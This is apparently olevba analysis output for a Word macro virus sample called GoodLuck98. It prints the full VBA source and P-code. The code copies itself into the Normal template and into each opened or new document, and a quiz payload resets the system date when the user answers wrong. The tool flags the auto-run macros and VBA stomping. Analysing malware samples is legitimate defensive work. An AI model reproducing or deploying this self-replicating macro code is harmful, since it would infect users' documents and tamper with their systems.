olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.GoodLuck-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.GoodLuck-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO GoodLuck98.bas 
in file: Virus.MSWord.GoodLuck-based - OLE stream: 'Macros/VBA/GoodLuck98'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExit()
    
    Dim varResponse As Variant
    Dim intRandom As Integer
    Dim intV As Integer
    Dim intW As Integer
    Dim intX As Integer
    Dim intY As Integer
    Dim intA As Integer
    Dim intAnswer As Integer
    Dim intRandomAnswer As Integer
    Dim intYear As Integer
    Dim longOffset As Long
    
    On Error GoTo Error
    
    Randomize
    intRandomAnswer = Int((2 * Rnd) + 1)
    intA = Int((100 * Rnd) + 1)
    intV = Int((10000 * Rnd) + 1)
    intW = Int((10000 * Rnd) + 1)
    intX = Int((100 * Rnd) + 1)
    intY = Int((100 * Rnd) + 1)
    
    If intRandomAnswer = 1 Then
        intAnswer = intV + intW - intX * intY
    Else
        intAnswer = (intV + intW - intX * intY) + intA
    End If

    intRandom = Int((10 * Rnd) + 1)
    If intRandom = 1 Then
        varResponse = MsgBox(Trim(intV) + " + " + Trim(intW) + " - " + Trim(intX) + " * " + Trim(intY) + _
         " = " + Trim(intAnswer) + " ?", _
        vbYesNo, "Good Luck 98")
        
        If ((varResponse = vbYes) And (intRandomAnswer = 1)) Or ((varResponse = vbNo) And (intRandomAnswer = 2)) Then
            MsgBox "Congratulation, you have done a great job !", vbInformation, "Congratulation !"
        Else
            
            intYear = Year(Date)
            
            longOffset = ((intYear - 1980) * 365#) + Int((intYear - 1980) / 4)
            If (intYear >= 1980) And (intYear <= 2079) Then
                Date = #9/24/80# + longOffset
            Else
                Date = #9/24/98#
            End If
            MsgBox "Sorry, you are wrong !", vbExclamation, "Sorry !"
            MsgBox "Today (" + Trim(Date) + ") is my birthday.", vbInformation, "Happy Birthday !"
        End If
    End If
    Exit Sub
    
Error:
    MsgBox "Sorry, you are wrong !", vbExclamation, "Sorry !"
    
End Sub

Sub AutoClose()

    On Error Resume Next
    
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="GoodLuck98", _
        Object:=wdOrganizerObjectProjectItems
    
End Sub

Sub AutoOpen()

    On Error Resume Next
    
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="GoodLuck98", _
        Object:=wdOrganizerObjectProjectItems
    
End Sub

Sub AutoNew()

    On Error Resume Next
    
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="GoodLuck98", _
        Object:=wdOrganizerObjectProjectItems
    
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.GoodLuck-based
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/GoodLuck98 - 4511 bytes
' Line #0:
' 	FuncDefn (Sub AutoExit())
' Line #1:
' Line #2:
' 	Dim 
' 	VarDefn varResponse (As Variant)
' Line #3:
' 	Dim 
' 	VarDefn intRandom (As Integer)
' Line #4:
' 	Dim 
' 	VarDefn intV (As Integer)
' Line #5:
' 	Dim 
' 	VarDefn intW (As Integer)
' Line #6:
' 	Dim 
' 	VarDefn intX (As Integer)
' Line #7:
' 	Dim 
' 	VarDefn intY (As Integer)
' Line #8:
' 	Dim 
' 	VarDefn intA (As Integer)
' Line #9:
' 	Dim 
' 	VarDefn intAnswer (As Integer)
' Line #10:
' 	Dim 
' 	VarDefn intRandomAnswer (As Integer)
' Line #11:
' 	Dim 
' 	VarDefn intYear (As Integer)
' Line #12:
' 	Dim 
' 	VarDefn longOffset (As Long)
' Line #13:
' Line #14:
' 	OnError Error 
' Line #15:
' Line #16:
' 	ArgsCall Read 0x0000 
' Line #17:
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St intRandomAnswer 
' Line #18:
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St intA 
' Line #19:
' 	LitDI2 0x2710 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St intV 
' Line #20:
' 	LitDI2 0x2710 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St intW 
' Line #21:
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St intX 
' Line #22:
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St intY 
' Line #23:
' Line #24:
' 	Ld intRandomAnswer 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld intV 
' 	Ld intW 
' 	Add 
' 	Ld intX 
' 	Ld intY 
' 	Mul 
' 	Sub 
' 	St intAnswer 
' Line #26:
' 	ElseBlock 
' Line #27:
' 	Ld intV 
' 	Ld intW 
' 	Add 
' 	Ld intX 
' 	Ld intY 
' 	Mul 
' 	Sub 
' 	Paren 
' 	Ld intA 
' 	Add 
' 	St intAnswer 
' Line #28:
' 	EndIfBlock 
' Line #29:
' Line #30:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St intRandom 
' Line #31:
' 	Ld intRandom 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LineCont 0x0008 1E 00 09 00 27 00 08 00
' 	Ld intV 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0003 " + "
' 	Add 
' 	Ld intW 
' 	ArgsLd Trim 0x0001 
' 	Add 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld intX 
' 	ArgsLd Trim 0x0001 
' 	Add 
' 	LitStr 0x0003 " * "
' 	Add 
' 	Ld intY 
' 	ArgsLd Trim 0x0001 
' 	Add 
' 	LitStr 0x0003 " = "
' 	Add 
' 	Ld intAnswer 
' 	ArgsLd Trim 0x0001 
' 	Add 
' 	LitStr 0x0002 " ?"
' 	Add 
' 	Ld vbYesNo 
' 	LitStr 0x000C "Good Luck 98"
' 	ArgsLd MsgBox 0x0003 
' 	St varResponse 
' Line #33:
' Line #34:
' 	Ld varResponse 
' 	Ld vbYes 
' 	Eq 
' 	Paren 
' 	Ld intRandomAnswer 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld varResponse 
' 	Ld vbNo 
' 	Eq 
' 	Paren 
' 	Ld intRandomAnswer 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #35:
' 	LitStr 0x002B "Congratulation, you have done a great job !"
' 	Ld vbInformation 
' 	LitStr 0x0010 "Congratulation !"
' 	ArgsCall MsgBox 0x0003 
' Line #36:
' 	ElseBlock 
' Line #37:
' Line #38:
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	St intYear 
' Line #39:
' Line #40:
' 	Ld intYear 
' 	LitDI2 0x07BC 
' 	Sub 
' 	Paren 
' 	LitR8 0x0000 0x0000 0xD000 0x4076 
' 	Mul 
' 	Paren 
' 	Ld intYear 
' 	LitDI2 0x07BC 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0004 
' 	Div 
' 	FnInt 
' 	Add 
' 	St longOffset 
' Line #41:
' 	Ld intYear 
' 	LitDI2 0x07BC 
' 	Ge 
' 	Paren 
' 	Ld intYear 
' 	LitDI2 0x081F 
' 	Le 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #42:
' 	LitDate 0x0000 0x0000 0xCC00 0x40DC 
' 	Ld longOffset 
' 	Add 
' 	St Date 
' Line #43:
' 	ElseBlock 
' Line #44:
' 	LitDate 0x0000 0x0000 0x9BC0 0x40E1 
' 	St Date 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	LitStr 0x0016 "Sorry, you are wrong !"
' 	Ld vbExclamation 
' 	LitStr 0x0007 "Sorry !"
' 	ArgsCall MsgBox 0x0003 
' Line #47:
' 	LitStr 0x0007 "Today ("
' 	Ld Date 
' 	ArgsLd Trim 0x0001 
' 	Add 
' 	LitStr 0x0011 ") is my birthday."
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x0010 "Happy Birthday !"
' 	ArgsCall MsgBox 0x0003 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	ExitSub 
' Line #51:
' Line #52:
' 	Label Error 
' Line #53:
' 	LitStr 0x0016 "Sorry, you are wrong !"
' 	Ld vbExclamation 
' 	LitStr 0x0007 "Sorry !"
' 	ArgsCall MsgBox 0x0003 
' Line #54:
' Line #55:
' 	EndSub 
' Line #56:
' Line #57:
' 	FuncDefn (Sub AutoClose())
' Line #58:
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' Line #61:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "GoodLuck98"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #62:
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Sub AutoOpen())
' Line #66:
' Line #67:
' 	OnError (Resume Next) 
' Line #68:
' Line #69:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "GoodLuck98"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #70:
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' 	FuncDefn (Sub AutoNew())
' Line #74:
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' Line #77:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "GoodLuck98"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #78:
' Line #79:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

